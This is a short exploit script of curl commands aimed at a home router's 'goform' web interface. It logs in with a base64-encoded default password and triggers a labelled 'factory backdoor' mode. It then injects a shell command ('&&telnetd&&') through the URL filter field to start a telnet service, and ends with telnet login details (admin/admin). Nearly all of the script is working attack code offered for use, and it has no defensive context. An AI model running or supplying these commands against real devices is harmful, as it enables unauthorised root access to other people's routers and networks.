# Login
curl -X POST -s --header "Referer: http://192.168.0.1/index.html" -d 'isTest=false&goformId=LOGIN&password=YWRtaW4K' http://192.168.0.1/goform/goform_set_cmd_process
# Factory Backdoor ---------------------->>>
curl -X POST -s -H "Referer: http://192.168.0.1/index.html" "http://192.168.0.1/goform/goform_set_cmd_process?isTest=false&goformId=CHANGE_MODE&change_mode=2&password=YWRtaW4K"
# Enable Root Acess --------------------->>>
curl -X POST "http://192.168.0.1/goform/goform_set_cmd_process" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Referer: http://192.168.0.1/index.html" --data "isTest=false&goformId=LOGIN&password=YWRtaW4K"
# Exploits Nvram ------------------------>>>
curl -X POST "http://192.168.0.1/goform/goform_set_cmd_process" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Referer: http://192.168.0.1/index.html" --data "isTest=false&goformId=URL_FILTER_ADD&addURLFilter=http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26"
# SSH Access ---------------------------->>>
telnet 192.168.0.1 4719
User: admin
Pass: admin
